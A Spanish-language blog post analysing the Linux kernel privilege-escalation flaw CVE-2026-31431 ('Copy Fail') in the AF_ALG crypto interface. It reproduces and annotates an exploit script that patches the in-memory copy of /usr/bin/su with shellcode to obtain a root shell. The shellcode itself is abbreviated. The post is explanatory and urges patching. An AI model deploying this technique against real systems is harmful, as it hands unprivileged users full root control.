---
title:  "Analizando CVE-2026-31431, más conocido como Copyfail"
date:   2026-05-06 00:00:00 -0500
tags: [seguridad, linux]
image: /assets/img/Sick_Tux.png
---
Esta es la historia del error de optimización que dejó vulnerable a Linux durante 9 años. El pasado 29 de abril de 2026, la comunidad de Linux fue sacudida por el descubrimiento de **CVE-2026-31431**, una vulnerabilidad bautizada como **"Copy Fail"**. Este fallo no solo permite a cualquier usuario local obtener privilegios de **root** de forma casi instantánea, sino que ya está siendo explotado activamente.

## ¿Qué es CVE-2026-31431 o "Copy Fail"?

La vulnerabilidad reside en un componente del kernel de Linux llamado `algif_aead`, que forma parte de la API criptográfica para el espacio de usuario (`AF_ALG`). 

El origen del problema se remonta a una "optimización" de código introducida en **julio de 2017** (kernel 4.14). El objetivo era mejorar el rendimiento al procesar datos cifrados, pero introdujo un fallo lógico en la forma en que el kernel maneja la transferencia de datos entre procesos, permitiendo una escritura de 4 bytes fuera de los límites en la **Page Cache**.

## Análisis Técnico del Exploit (Theori-io)

El script publicado por los investigadores de **Theori** es una proeza del minimalismo (aprox. 732 bytes). A continuación, desglosaré el código real para entender cómo logra lo imposible: modificar un archivo de solo lectura en la memoria del sistema.

### El Código del Exploit

```python
import socket, os, struct, zlib
from base64 import b64decode as d

# 1. El Target: Abrimos el binario 'su' (SUID-root)
f = os.open("/usr/bin/su", os.O_RDONLY)

# 2. El Payload: Shellcode comprimido que parcha la autenticacion
e = zlib.decompress(d("78da...")) # Shellcode que saltara el login

def c(f, t, chunk):
    # 3. Preparacion del Socket AF_ALG
    # Usamos authencesn porque su manejo de buffers es vulnerable
    a = socket.socket(38, 5, 0) # 38 = AF_ALG
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    
    # Configuracion de llaves y AEAD
    a.setsockopt(279, 1, d('0800010000000010'+'0'*64)) # SOL_ALG, SET_KEY
    a.setsockopt(279, 5, None, 4) # SET_AEAD_AUTHSIZE
    u, _ = a.accept()

    # 4. El "Disparo": sendmsg inyecta el chunk de 4 bytes
    u.sendmsg([b"A"*4 + chunk], [], 0, [(279, 3, struct.pack("I", 4))])

    # 5. La Magia: splice() conecta el archivo con el socket
    r, w = os.pipe()
    os.splice(f, w, 4096, t) # Lee del archivo 'su' hacia el pipe
    os.splice(r, u.fileno(), 4096) # Mueve del pipe al socket criptográfico

# Bucle que parcha el binario en RAM 4 bytes a la vez
i = 0
while i < len(e):
    c(f, i, e[i:i+4])
    i += 4

# 6. Ejecucion: Ahora 'su' en RAM es nuestra shell de root
os.system("su")
```

### ¿Cómo funciona realmente?

1.  **Manipulación de la caché:** El script no intenta escribir en el disco duro. En su lugar, utiliza `os.splice()` para cargar el contenido de `/usr/bin/su` en la **Page Cache** (la memoria RAM donde el kernel guarda copias de los archivos para que el sistema sea rápido).
2.  **El Bug de "In-place":** Al usar el socket `AF_ALG` con el algoritmo `authencesn`, el kernel intenta realizar una operación criptográfica directamente sobre esas páginas de memoria. Debido al bug, el kernel "se confunde" y escribe los 4 bytes que nosotros enviamos (`chunk`) sobre el código original del programa.
3.  **Bypass de Solo Lectura:** Normalmente, el kernel protegería esta memoria con un mecanismo llamado *Copy-on-Write* (CoW). Sin embargo, la falla lógica hace que el kernel crea que esa página es un buffer temporal privado, permitiendo la escritura directa.
4.  **Ejecución Silenciosa:** Cuando el script termina, el archivo `/usr/bin/su` en el disco sigue intacto (su hash MD5/SHA no cambia), pero la copia que el CPU ejecutará está parchada para darnos acceso total como root.



Resulta cuando menos irónico que una optimización de rendimiento escrita hace 9 años resultó ser la llave maestra para cualquier sistema Linux moderno. Demás esta decir lo siguiente: **actualiza tu kernel hoy mismo**.

---

## Fuentes

*   **Repositorio Original del Exploit:** [theori-io/copy-fail-CVE-2026-31431](https://github.com/theori-io/copy-fail-CVE-2026-31431)
*   **Investigación Técnica:** [Theori Xint - Copy Fail Analysis](https://xint.io/blog/copy-fail-linux-kernel-vulnerability)
*   **Aviso de Seguridad:** [CISA Known Exploited Vulnerabilities Catalog (CVE-2026-31431)](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
*   **Referencia del Kernel:** [Linux Kernel Git - Commit a664bf3d603d (Fix)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=a664bf3d603d)
*   **Imagen de portada** [Fix "Copy Fail" before your Linux system gets sick](https://opensourcewatch.beehiiv.com/p/fix-copy-fail-before-your-linux-system-gets-sick)
